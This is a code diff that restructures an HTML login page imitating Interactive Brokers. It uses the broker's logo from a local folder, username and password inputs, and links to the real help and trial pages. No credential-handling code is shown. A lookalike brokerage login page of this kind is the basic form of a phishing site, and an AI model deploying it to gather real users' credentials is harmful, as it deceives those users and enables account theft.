@@ -8,30 +8,31 @@
 		<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 	</head>
 	<body>
-		<div class="logo">
-			<img src="slike/Interactive_Brokers_Logo.webp" height="40">
-		</div>
-		
-		<div class="vnos">
-		    <span>👤</span>
-		    <input type="text" id="username" placeholder="Username">
-		</div>
-		
-		<div class="vnos">
-		    <span>🔒</span>
-		    <input type="password" id="password" placeholder="Password">
-		</div>
-		
-		<a class="problem"
-		   href="https://www.interactivebrokers.ie/credential.recovery/login-help"
-		   target="_blank">
-		    Problem with logging in?
-		</a>
-		
-		<br>
-		
-		<button type="button" onclick="login()">Login</button>
-			<form>
+		<form>
+			<div class="logo">
+				<img src="slike/Interactive_Brokers_Logo.webp" height="40">
+			</div>
+			
+			<div class="vnos">
+			    <span>👤</span>
+			    <input type="text" id="username" placeholder="Username">
+			</div>
+			
+			<div class="vnos">
+			    <span>🔒</span>
+			    <input type="password" id="password" placeholder="Password">
+			</div>
+			
+			<a class="problem"
+			   href="https://www.interactivebrokers.ie/credential.recovery/login-help"
+			   target="_blank">
+			    Problem with logging in?
+			</a>
+			
+			<br>
+			
+			<button type="button" onclick="login()">Login</button>
+		</form>
 			<br><br>
 			<p class="acc">Don't have an account?<a href="https://www.interactivebrokers.ie/Universal/Application?ft=T" target="blanc"> Try the free trial</a>
 			</p>
